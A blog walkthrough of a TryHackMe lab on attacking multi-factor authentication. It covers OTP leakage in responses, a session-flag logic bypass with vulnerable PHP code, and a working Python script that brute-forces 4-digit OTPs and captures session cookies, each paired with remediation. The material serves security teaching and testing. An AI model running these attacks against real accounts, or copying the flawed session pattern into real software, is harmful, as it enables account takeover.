---
title: "Exploiting Multi-Factor Authentication - TryHackMe Walkthrough"
date: 2026-04-01T23:00:00+05:30
lastmod: 2026-04-01T23:00:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://bit.ly/34sGFiK
featureimage: img/thm.png
simg: img/thm.png
categories:
  - TryHackMe
tags:
  - tryhackme
  - rooms
  - thm
  - mfa
  - 2fa
  - otp
  - authentication
  - bug-bounty
  - web-application
  - pentesting
draft: false
description: "A practical walkthrough of exploiting Multi-Factor Authentication weaknesses. Covers OTP leakage, MFA bypass via logic flaws, and brute-forcing with auto-logout evasion -- from the TryHackMe Web Application Pentesting path."
---

## Overview

Multi-Factor Authentication (MFA) is supposed to be the safety net when passwords fail. But a poorly implemented MFA can be worse than no MFA at all -- it gives users a false sense of security while leaving the door wide open.

This post covers three practical MFA exploitation techniques from the [TryHackMe Web Application Pentesting](https://tryhackme.com/r/path/outline/webapppentesting) path. Each technique is something you can look for in real bug bounty programs.

## How MFA Works (Quick Recap)

MFA adds a second verification step after the password:

1. **Something you know** -- password
2. **Something you have** -- OTP via SMS/email/authenticator app
3. **Something you are** -- biometrics

The typical flow is:

```
User enters password --> Server validates --> Server sends OTP --> User enters OTP --> Access granted
```

The vulnerabilities lie in **how** each step is implemented.

## Attack 1: OTP Leakage in API Responses

### The Vulnerability

Some applications return the OTP directly in the server response. This usually happens because:

- Developers left debugging info in production responses
- The API returns the full object including the OTP field instead of just a success/failure status
- Poor security review during development

### How to Exploit

1. Open the application login page
2. Open **Browser DevTools** (F12) and go to the **Network** tab
3. Enter valid credentials and submit
4. When the MFA page loads, watch for XHR requests to endpoints like `/token`, `/otp`, `/verify`, `/2fa`
5. Click the request and check the **Response** tab
6. If the OTP is in the response body -- copy it and submit

### What to Look For in Bug Bounty

```
# Common response patterns that leak OTPs:

{"status": "success", "otp": "482913"}           # Direct leak
{"token": "583721", "expires": 300}               # Token in response
{"user": {"email": "...", "pending_otp": "1234"}} # Nested in user object
```

Check **every XHR response** during the MFA flow. Also check response headers -- some apps put tokens in custom headers like `X-OTP-Token`.

### Remediation

Never return the OTP in any response. Only return a generic message:

```json
{"status": "otp_sent", "message": "Check your email"}
```

## Attack 2: MFA Bypass via Logic Flaw

### The Vulnerability

This is a classic authorization bug: the application sets the `authenticated` session flag **before** MFA is completed. After entering a valid password, you can skip the OTP page entirely by navigating directly to the dashboard.

### The Flawed Code Pattern

```php
// VULNERABLE: authenticated flag set before MFA
if (authenticate($email, $password)) {
    $_SESSION['authenticated'] = true;  // BUG: Set too early!
    header('Location: /mfa');
    return;
}
```

The dashboard only checks:
```php
if (!$_SESSION['authenticated']) {
    header('Location: /login');
}
```

Since `authenticated` is already `true` after the password step, the dashboard lets you in.

### How to Exploit

1. Log in with valid credentials (username + password)
2. When redirected to the MFA/OTP page -- **do NOT enter the OTP**
3. Instead, manually change the URL to the dashboard: `/dashboard` or `/account` or `/home`
4. If the application only checks the session flag and not MFA completion, you're in

### What to Look For in Bug Bounty

After completing step 1 of authentication (password), try accessing:

- `/dashboard`
- `/account`
- `/settings`
- `/api/v1/user/profile`
- Any authenticated endpoint

If any of them respond with actual user data instead of redirecting to MFA, that is a **P1/Critical** bypass.

### Remediation

Use two separate session flags:

```php
// SECURE: Separate flags for each auth step
$_SESSION['password_verified'] = true;   // After password
$_SESSION['mfa_completed'] = true;       // After OTP

// Dashboard check requires BOTH
if (!$_SESSION['password_verified'] || !$_SESSION['mfa_completed']) {
    header('Location: /login');
    exit;
}
```

## Attack 3: Brute-Forcing OTP Despite Auto-Logout

### The Vulnerability

Many apps log you out after a failed OTP attempt to prevent brute force. But if the attacker can **re-authenticate and retry automatically**, the logout becomes useless.

The key insight: logout per session does not equal lockout per account.

### How to Exploit

Write an automation script that:

1. Creates a **new session** for each attempt
2. Logs in with valid credentials
3. Submits an OTP guess
4. If redirected to login (failed), loops back to step 1
5. If redirected to dashboard (success), captures the session cookie

```python
import requests

login_url = 'https://target.com/login'
otp_url = 'https://target.com/mfa'
credentials = {'email': 'user@test.com', 'password': 'password123'}

for otp in range(0, 10000):
    session = requests.Session()
    session.post(login_url, data=credentials)

    otp_str = str(otp).zfill(4)
    response = session.post(otp_url, data={
        'code-1': otp_str[0],
        'code-2': otp_str[1],
        'code-3': otp_str[2],
        'code-4': otp_str[3]
    }, allow_redirects=False)

    if response.status_code == 302:
        location = response.headers.get('Location', '')
        if '/dashboard' in location:
            print(f'OTP found: {otp_str}')
            print(f'Cookies: {session.cookies.get_dict()}')
            break
    
    if otp % 100 == 0:
        print(f'Tried {otp} OTPs...')
```

### What to Look For in Bug Bounty

1. Does the app **lock the account** or just **destroy the session** on failed OTP?
2. Can you immediately re-login after being logged out?
3. Is there any rate limiting on the login endpoint itself?
4. What is the OTP length? 4 digits = 10,000 combinations (feasible), 6 digits = 1,000,000 (harder but possible with time)
5. Does the OTP change on each login or stay the same within a time window?

### Remediation

- Implement **account-level lockout** (not just session logout) after N failed MFA attempts
- Use **rate limiting per account**, not per session or IP
- Use **6+ digit** OTP codes
- Set **short OTP expiry** (30-60 seconds)
- Alert the user on multiple failed MFA attempts

## Bug Bounty Severity Guide

| MFA Vulnerability | Typical Severity | Notes |
|---|---|---|
| OTP in API response | P2 (High) | Direct credential leak |
| MFA bypass via URL manipulation | P1 (Critical) | Complete auth bypass |
| OTP brute force (no lockout) | P2-P3 | Depends on OTP length and rate limiting |
| MFA not enforced on API endpoints | P2 (High) | Often overlooked |
| MFA bypass via session fixation | P1 (Critical) | Session manipulation |

## Key Takeaways

1. **Always check XHR responses** during MFA flow -- OTPs leak more often than you think
2. **Try accessing post-auth pages** immediately after password entry, before completing MFA
3. **Auto-logout is not account lockout** -- automation can beat session-based protections
4. MFA bugs are **high severity** and programs pay well for them
5. Test both the **web app and the API** -- the API often has weaker MFA enforcement

## Room Link

[TryHackMe - Multi-Factor Authentication](https://tryhackme.com/r/room/multifactorauthentications) (Part of the Web Application Pentesting path)

---

*This post is part of my TryHackMe learning series. Techniques documented here are for authorized security testing only.*
